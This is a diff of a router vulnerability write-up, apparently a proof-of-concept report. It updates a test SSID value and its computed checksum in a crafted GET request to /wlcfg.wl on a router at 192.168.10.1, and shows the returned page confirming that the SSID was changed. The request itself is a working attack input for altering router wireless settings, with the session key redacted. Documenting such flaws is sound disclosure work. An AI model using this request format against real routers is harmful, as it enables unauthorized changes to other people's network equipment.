@@ -174,13 +174,13 @@ The checksum is calculated before the `sessionKey` parameter is appended.
 For the controlled request using the test SSID:
 
 
-HACKED-BY-AZAN
+HACKED-BY-AZAN1
 
 
 the calculated checksum was:
 
 
-52171
+52220
 
 
 ---
@@ -210,7 +210,7 @@ The following is a sanitized representation of the successful request.
 Sensitive session material is intentionally removed:
 
 http
-GET /wlcfg.wl?wlSsidIdx=0&wlEnableHspot=1&wlEnbl=1&wlHide=0&wlAPIsolation=0&wlSsid=HACKED-BY-AZAN&wlCountry=PK&wlRegRev=0&wlMaxAssoc=16&wlDisableWme=0&wlEnableWmf=1&wlSyncNvram=1&checksumKey=52171&sessionKey=[REDACTED] HTTP/1.1
+GET /wlcfg.wl?wlSsidIdx=0&wlEnableHspot=1&wlEnbl=1&wlHide=0&wlAPIsolation=0&wlSsid=HACKED-BY-AZAN1&wlCountry=PK&wlRegRev=0&wlMaxAssoc=16&wlDisableWme=0&wlEnableWmf=1&wlSyncNvram=1&checksumKey=52220&sessionKey=[REDACTED] HTTP/1.1
 Host: 192.168.10.1
 Connection: close
 
@@ -235,7 +235,7 @@ After allowing the wireless subsystem to restart, the wireless configuration pag
 The returned page contained:
 
 
-var ssid = 'HACKED-BY-AZAN'
+var ssid = 'HACKED-BY-AZAN1'
 
 
 This confirmed that the SSID had actually been changed.
